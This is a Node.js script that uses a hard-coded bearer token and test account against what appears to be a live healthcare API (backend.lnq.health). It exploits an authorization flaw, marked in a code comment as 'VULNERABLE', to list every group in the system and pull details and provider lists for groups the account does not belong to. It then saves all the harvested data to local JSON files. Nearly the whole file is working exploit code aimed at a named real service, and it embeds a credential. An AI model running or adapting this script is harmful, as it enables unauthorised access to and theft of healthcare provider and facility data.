#!/usr/bin/env node

/**
 * Extract ALL actual data from API endpoints
 * This fetches the complete raw data, not just analysis
 */

const BASE_URL = 'https://backend.lnq.health/api';
const TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjliYWRlN2YyLTA3NmEtNGY4MC1hN2E2LTI4Y2IzZmJhMGQ1NiIsImlhdCI6MTc2ODk5ODc5NCwiZXhwIjoxNzY5MDg1MTk0fQ.fY6PZcDVJ8lXhQwR1TrisLRZ1QvZR2j-oFnT6r_r95Q';

const extractedData = {
  timestamp: new Date().toISOString(),
  testAccount: {
    email: 'test443675@example.com',
    userId: '9bade7f2-076a-4f80-a7a6-28cb3fba0d56'
  },
  endpoints: {}
};

async function fetchData(endpoint, description) {
  console.log(`\n📥 Fetching: ${endpoint}`);

  try {
    const response = await fetch(`${BASE_URL}${endpoint}`, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${TOKEN}`
      }
    });

    const data = await response.json();

    extractedData.endpoints[endpoint] = {
      description,
      status: response.status,
      success: response.ok,
      data: data,
      timestamp: new Date().toISOString()
    };

    console.log(`   Status: ${response.status}`);
    console.log(`   Data size: ${JSON.stringify(data).length} bytes`);

    return data;
  } catch (error) {
    console.log(`   ❌ Error: ${error.message}`);
    extractedData.endpoints[endpoint] = {
      description,
      error: error.message,
      timestamp: new Date().toISOString()
    };
    return null;
  }
}

async function fetchAllPages(baseEndpoint, description) {
  console.log(`\n📚 Fetching all pages: ${baseEndpoint}`);

  const allData = [];
  let page = 1;
  let hasMore = true;

  while (hasMore && page <= 10) { // Safety limit of 10 pages
    const endpoint = `${baseEndpoint}?page=${page}&perPage=50`;
    const data = await fetchData(endpoint, `${description} - Page ${page}`);

    if (data && data.docs && data.docs.length > 0) {
      allData.push(...data.docs);
      console.log(`   Collected ${data.docs.length} items from page ${page}`);

      // Check if there are more pages
      if (data.currentPage >= data.totalPages) {
        hasMore = false;
      } else {
        page++;
      }
    } else {
      hasMore = false;
    }
  }

  return allData;
}

async function extractAllData() {
  console.log('🚀 Starting complete data extraction...');
  console.log('=' .repeat(60));

  // 1. Get current user profile
  await fetchData('/user', 'Current user complete profile');

  // 2. Get ALL groups (all pages)
  const allGroups = await fetchAllPages('/allGroups', 'All groups in system');
  console.log(`\n✅ Total groups collected: ${allGroups.length}`);

  extractedData.allGroupsCollected = allGroups;

  // 3. Get user's groups
  await fetchData('/myGroups?page=1&perPage=50', 'User group memberships');

  // 4. Check user permissions
  await fetchData('/group/checkUserLnqRights', 'User LnQ permissions');
  await fetchData('/group/checkUserRVUTrackerRights', 'User RVU tracker permissions');

  // 5. Get groups with special rights
  await fetchData('/group/getGroupsWithLnqRights?page=1&perPage=50', 'Groups with LnQ rights');

  // 6. Try to access each group we found
  console.log('\n🔍 Attempting to access individual groups...');

  const groupsToTest = allGroups.slice(0, 5); // Test first 5 groups

  for (const group of groupsToTest) {
    const groupId = group.id || group._id;
    if (groupId) {
      console.log(`\n   Testing group: ${group.facilityName} (${groupId})`);

      // Get full group details (VULNERABLE - should not work without membership!)
      await fetchData(`/group?id=${groupId}`, `Group details: ${group.facilityName}`);

      // Try to get providers in group
      await fetchData(`/group/providers?id=${groupId}&page=1&perPage=50`, `Providers in: ${group.facilityName}`);

      // Try provider search
      await fetchData(`/group/${groupId}/providers/search?search=a`, `Provider search in: ${group.facilityName}`);
    }
  }

  console.log('\n' + '='.repeat(60));
  console.log('✅ Data extraction complete!');
  console.log('='.repeat(60));
}

async function saveData() {
  const fs = require('fs');

  // Save complete data
  const filename = `complete-extracted-data-${Date.now()}.json`;
  fs.writeFileSync(filename, JSON.stringify(extractedData, null, 2));
  console.log(`\n💾 Complete data saved to: ${filename}`);

  // Create a summary of what was extracted
  const summary = {
    timestamp: extractedData.timestamp,
    testAccount: extractedData.testAccount,
    totalEndpointsTested: Object.keys(extractedData.endpoints).length,
    successfulRequests: Object.values(extractedData.endpoints).filter(e => e.success).length,
    totalGroupsFound: extractedData.allGroupsCollected ? extractedData.allGroupsCollected.length : 0,
    endpointsSummary: Object.entries(extractedData.endpoints).map(([endpoint, data]) => ({
      endpoint,
      status: data.status,
      description: data.description,
      dataSize: data.data ? JSON.stringify(data.data).length : 0
    }))
  };

  const summaryFilename = `extraction-summary-${Date.now()}.json`;
  fs.writeFileSync(summaryFilename, JSON.stringify(summary, null, 2));
  console.log(`📊 Summary saved to: ${summaryFilename}`);

  // Print quick stats
  console.log('\n📈 Quick Stats:');
  console.log(`   Total endpoints tested: ${summary.totalEndpointsTested}`);
  console.log(`   Successful requests: ${summary.successfulRequests}`);
  console.log(`   Total groups found: ${summary.totalGroupsFound}`);
  console.log(`   Total data size: ${JSON.stringify(extractedData).length} bytes`);
}

async function main() {
  console.log('\n🔓 COMPLETE DATA EXTRACTION');
  console.log('Using access token to extract all accessible data\n');

  await extractAllData();
  await saveData();

  console.log('\n✨ All data has been extracted and saved!');
  console.log('\nFiles created:');
  console.log('  - complete-extracted-data-[timestamp].json (FULL DATA)');
  console.log('  - extraction-summary-[timestamp].json (Summary)');
}

main();
